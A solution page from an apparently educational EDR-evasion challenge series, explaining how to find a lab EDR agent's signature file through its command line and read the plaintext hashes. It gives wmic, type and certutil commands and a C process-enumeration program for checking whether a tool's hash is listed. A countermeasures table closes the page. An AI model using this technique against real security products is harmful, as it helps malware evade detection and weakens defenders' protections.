---
title: "Solution 30: Read the Signature Database"
difficulty: easy
category: "Signature Bypass"
---

[Back to Challenge]({{ '/challenges/30-read-signature-file/' | relative_url }})

## Overview

The signature database is a plaintext file whose path is visible on the EDR's command line. An attacker can read it to learn exactly which hashes are known.

## Solution

```powershell
# Step 1: Find the signature file path from the EDR's command line
wmic process where "name='edr_agent.exe'" get commandline
# Output: edr_agent.exe --signatures signatures/malware_hashes.txt ...

# Step 2: Read the signature file
type signatures\malware_hashes.txt

# Step 3: Check if your binary's hash is in the list
certutil -hashfile your_tool.exe SHA256
# Compare against the signature file — if not listed, it won't be detected
```

```c
#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>

// Enumerate processes to find EDR and extract --signatures path
int main() {
    // Find the signature file from EDR command line
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32W pe = { sizeof(pe) };

    if (Process32FirstW(snap, &pe)) {
        do {
            if (wcsstr(pe.szExeFile, L"edr_agent") != NULL) {
                // Found EDR process — get its command line from PEB
                // Extract path after --signatures
                printf("Found EDR PID: %lu\n", pe.th32ProcessID);
            }
        } while (Process32NextW(snap, &pe));
    }
    CloseHandle(snap);

    // Or just read common paths directly
    FILE* f = fopen("signatures\\malware_hashes.txt", "r");
    if (f) {
        char line[256];
        printf("\n=== Known Hashes ===\n");
        while (fgets(line, sizeof(line), f)) {
            if (line[0] != '#' && line[0] != '\n')
                printf("  %s", line);
        }
        fclose(f);
    }
    return 0;
}
```

## Why It Works

Three compounding weaknesses:

1. **Plaintext storage**: The signature file is human-readable with helpful comments identifying each sample
2. **Command-line exposure**: The `--signatures` path is visible to any process via WMI, `ProcessExplorer`, or `/proc`
3. **Predictable location**: Stored in the EDR's own directory under `signatures/`

## Countermeasures

| Defense | What It Does |
|---------|-------------|
| Encrypted signature DB | Signatures decrypted only in memory at runtime |
| Embedded signatures | Compiled into the binary, not a separate file |
| Cloud-based lookups | Hash sent to a cloud service, no local database |
| ACL protection | Signature file readable only by the EDR's service account |
